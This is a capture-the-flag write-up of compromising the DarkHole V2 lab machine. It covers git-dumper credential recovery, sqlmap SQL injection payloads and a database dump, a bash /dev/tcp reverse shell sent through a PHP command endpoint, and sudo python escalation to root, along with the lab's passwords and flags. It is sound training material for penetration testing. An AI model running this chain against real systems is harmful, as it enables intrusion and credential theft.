## CTF 04
> Capture The Flag.
> 
> IP: 192.168.10.17
> 
> The flag is stored in the flag.txt file.

> Capture The Flag.
> 
> IP: 192.168.10.17
> 
> The flag is stored in the root.txt file.


### Nmap
First thing to do is to scan for open ports.

```bash 
$ nmap -sV -Pn -p- -A 192.168.10.17
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-14 06:40 EDT
Nmap scan report for 192.168.10.17
Host is up (0.0043s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: DarkHole V2
| http-git: 
|   192.168.10.17:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure 
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 332.80 seconds
```

The scan shows that there are two running services, SSH and a webserver, which has its git repository exposed.

After opening the website in a browser, a link to the login page is shown.

![Index page DarkHoleV2](ctf4/imagen_2022-06-17_095914094.png)

![Login page DarkHoleV2](ctf4/imagen_2022-06-17_100010931.png)

Here we can see there is a login page, but since we do not have any credential yet, we cannot do anything here.

### .git
On the exposed git directory we can see the last commit in `.git/COMMIT_EDITMSG`, which reads:

> i changed login.php file for more secure

![.git page DarkHoleV2](ctf4/imagen_2022-06-17_100133653.png){width=65%}

To further investigate the source code, the repository is downloaded using [git-dump](https://github.com/arthaud/git-dumper).


Now that we have stored the content of the web in the our local directory `./website` we are running the command `git diff` with the last commit id to see the changes to the `login.php`.

```bash
$ pip install git-dumper

$ git-dumper http://192.168.10.17 ./website

$ git diff a4d900a8d85e8938d3601f3cef113ee293028e10

diff --git a/login.php b/login.php
index 8a0ff67..0904b19 100644
--- a/login.php
+++ b/login.php
@@ -2,7 +2,10 @@
 session_start();
 require 'config/config.php';
 if($_SERVER['REQUEST_METHOD'] == 'POST'){
-    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
+    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
+    $check = $connect->query("select * from users where email='$email' and password='$pass'
    and id=1");
+    if($check->num_rows){
         $_SESSION['userid'] = 1;
         header("location:dashboard.php");
         die();
```
 
So now that we have the credentials `lush@admin.com:321` as user and password we can use them to login as the admin. It shows a profile page of our user.

![User page DarkHoleV2](ctf4/imagen_2022-06-17_104736996.png)

### SQL Inject
Using burpsuite we save a request which contains an authenticated cookie, to be used by `sqlmap`. With that we try to SQL inject all possible parameters.

```bash
$ sqlmap -r request.txt --dbs --batch       
        ___
       __H__                                                                                                       
 ___ ___[)]_____ ___ ___  {1.6.4#stable}                                                                           
|_ -| . [.]     | .'| . |                                                                                          
|___|_  [']_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent
    is illegal. It is the end user's responsibility to obey all applicable local, state
    and federal laws. Developers assume no liability and are not responsible for any misuse
    or damage caused by this program

[*] starting @ 12:40:59 /2022-06-15/

[12:40:59] [INFO] parsing HTTP request from 'request.txt'
[12:40:59] [INFO] resuming back-end DBMS 'mysql' 
[12:40:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7829 FROM (SELECT(SLEEP(5)))FOXp) AND 'AndS'='AndS

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-2051' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717871,
        0x7a5751754e596265786e54434d724b50496467705467475a656f41726a694e7a7a45724d6a674661,
        0x716a6b7a71),NULL,NULL,NULL-- -
---
[12:40:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[12:40:59] [INFO] fetching database names
available databases [5]:
[*] darkhole_2
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[12:40:59] [INFO] fetched data logged to text files under
    '/home/pascal/.local/share/sqlmap/output/192.168.10.17'

[*] ending @ 12:40:59 /2022-06-15/

$ sqlmap -r request.txt -D darkhole_2 --dump-all --batch 
[*] starting @ 12:41:31 /2022-06-15/

[12:41:31] [INFO] parsing HTTP request from 'request.txt'
[12:41:31] [INFO] resuming back-end DBMS 'mysql' 
[12:41:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7829 FROM (SELECT(SLEEP(5)))FOXp) AND 'AndS'='AndS

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-2051' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717871,
        0x7a5751754e596265786e54434d724b50496467705467475a656f41726a694e7a7a45724d6a674661,
        0x716a6b7a71),NULL,NULL,NULL-- -
---
[12:41:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[12:41:31] [INFO] fetching tables for database: 'darkhole_2'
[12:41:31] [INFO] fetching columns for table 'users' in database 'darkhole_2'
[12:41:31] [INFO] fetching entries for table 'users' in database 'darkhole_2'
Database: darkhole_2
Table: users
[1 entry]
+----+----------------+-------------------------------------------+----------+-----------------+----------------+
| id | email          | address                                   | password | username        | contact_number |
+----+----------------+-------------------------------------------+----------+-----------------+----------------+
| 1  | lush@admin.com |  Street, Pincode, Province/State, Country | 321      | Ayuda por favor | 33             |
+----+----------------+-------------------------------------------+----------+-----------------+----------------+

[12:41:31] [INFO] table 'darkhole_2.users' dumped to CSV file
    '/home/pascal/.local/share/sqlmap/output/192.168.10.17/dump/darkhole_2/users.csv'                                                                                       
[12:41:31] [INFO] fetching columns for table 'ssh' in database 'darkhole_2'
[12:41:31] [INFO] fetching entries for table 'ssh' in database 'darkhole_2'
Database: darkhole_2
Table: ssh
[1 entry]
+----+------+--------+
| id | pass | user   |
+----+------+--------+
| 1  | fool | jehad  |
+----+------+--------+

[12:41:31] [INFO] table 'darkhole_2.ssh' dumped to CSV file
'/home/pascal/.local/share/sqlmap/output/192.168.10.17/dump/darkhole_2/ssh.csv'                                                                                           
[12:41:31] [INFO] fetched data logged to text files under
'/home/pascal/.local/share/sqlmap/output/192.168.10.17'

[*] ending @ 12:41:31 /2022-06-15/
```
`sqlmap` successfully injected the `id` parameter and retrieved the ssh table, containing authentication data for the user `jehad:fool`.
With that information, we can connect to the SSH server.

Once we are connected we can find the user flag in the directory of `losy`.

```bash 
jehad@darkhole:/home$ cat losy/user.txt 
cyberctfd{ejkedSmQx5zEBJz9PjE8gTbPkHr839EY}
```

### Escalate privileges
Running linpeas, it shows a cron to start a php server on `localhost:9999` in `/opt/web/index.php`.
`* * * * * losy cd /opt/web && php -S localhost:9999`

The php script executes commands that it received,
```bash 
jehad@darkhole:~$ cat /opt/web/index.php 
<?php
echo "Parameter GET['cmd']";
if(isset($_GET['cmd'])){
echo system($_GET['cmd']);
}
?>
```

On the attacker machine a reverse shell using `nc -lvp 1337` and portforwarding using SSH with `ssh jehad@192.168.10.17 -L 9999:localhost:9999` is started.

We send this payload urlencoded to activate the reverse shell:
```bash
bash -c 'bash -i >& /dev/tcp/192.168.9.4/1337 0>&1
```

```bash
$ curl 192.168.10.17:9999/index.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev
    %2Ftcp%2F192.168.9.4%2F1337%200%3E%261%27`
```

### Escalate privileges, again
Now that we have a shell as losy, we take a look in the `.bash_history`.

```bash
$ ls -lah ~/.bash_history
...
P0assw0rd losy:gang
sudo -l
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo python -c 'import os; os.system("/bin/sh")'
sudo /usr/bint/python3 -c 'import os; os.system("/bin/sh")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
...
```

From that we can conclude, that losy can execute python as root and has the password `gang`. We can use that to connect via ssh, to use sudo. The python shell is executed to gain root rights and extract the flag.

```bash 
losy@darkhole:~$ sudo -l
[sudo] password for losy: 
Matching Defaults entries for losy on darkhole:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User losy may run the following commands on darkhole:
    (root) /usr/bin/python3

losy@darkhole:~$ sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cyberctfd{tuF9WIjTCUGyKe8JVKGmqSaDuHp4mQqc}
```
